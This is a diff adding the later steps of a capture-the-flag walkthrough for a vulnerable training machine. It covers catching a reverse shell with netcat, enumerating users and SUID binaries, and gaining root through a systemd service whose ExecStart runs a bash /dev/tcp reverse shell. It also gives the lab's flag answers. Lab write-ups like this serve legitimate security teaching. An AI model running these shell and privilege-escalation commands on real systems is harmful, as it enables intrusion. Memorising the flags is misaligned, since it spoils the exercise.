@@ -158,4 +158,119 @@ $daemon = 0;
 $debug = 0;
 ```
 
-After uploading you will be allowed to use this reverse shell with NetCat.
+After uploading you will be allowed to use this reverse shell with NetCat. Firstly we have to run the reverse shell on webserver. To do this, run GoBuster again for URL http://10.10.225.214:3333/internal. It takes quite long, but finally there's subdirectory internal/uploads.
+
+Run NetCat.
+`nc nvlp 1234`
+
+1234 is a port we are listening on.
+
+```
+root@ip-10-10-99-152:~/Desktop# nc -lvnp 1234
+Listening on [0.0.0.0] (family 0, port 1234)
+Connection from 10.10.225.214 46470 received!
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 03:51:36 up 10 min,  0 users,  load average: 6.02, 3.73, 1.76
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ hostname
+vulnuniversity
+```
+
+Now we've got access as ordinary user www-data.
+
+In `/etc/passwd` there are some users, lets list them with `cat /etc/passwd | tr ":" " " | awk '{print $1}'`. 
+`root daemon bin sys sync games man lp mail news uucp proxy www-data backup list irc gnats nobody systemd-timesync systemd-network systemd-resolve systemd-bus-proxy syslog _apt lxd messagebus uuidd dnsmasq sshd ftp bill`
+
+Only one has its own directory in `/home/` - bill.
+
+> What is the name of the user who manages the webserver?
+
+**Answer: Bill**
+
+A user flag is in `/home/bill/user.txt`
+> What is the user flag?
+
+**Answer: 8bd7992fbe8a6ad22a63361004cfcedb**
+
+## Task 5: Privilege Escalation
+In  Linux, SUID (**set owner userId upon execution)** is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
+For example, the binary file to change your password has the SUID bit set on it (`/usr/bin/passwd`). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.
+It looks like rw**s**rwxrwx.
+
+We can find it with command:
+```
+$ find / -user root -perm -4000 -print 2>/dev/null
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/mount.cifs
+```
+
+Unfortunetly we cant use `su` cause we are not in terminal, but there is still systemctl to use.
+
+> On the system, search for all SUID files. What file stands out?
+
+**Answer: /bin/systemctl**
+
+We can use systemctl to create service as root. This service could run any bash command as root. On website https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md there are reverse shells and we are looking for the bash one.
+`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`
+This command works also for UDP and TCP.
+
+To create the service we have to save it wherever. All users can do it in /tmp/.
+```
+mkdir /tmp/root/
+touch /tmp/root/root.service
+```
+
+In the root.service we create new service called *root*.
+```
+[Unit]
+Description=root
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.167.137/4242 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+```
+Now we can run service and it will make reverse shell as root on port 4242.
+On kali:
+`netcat -lvnp 4242`
+
+On reverse shell:
+`systemctl enable /tmp/root/root.service`
+`systemctl start root`
+
+User flag is in its home directory
+`cat /root/root.txt`
+
+> Become root and get the last flag (/root/root.txt)
+
+**Answer: a58ff8579f0a9270368d33a9966c7fd5**
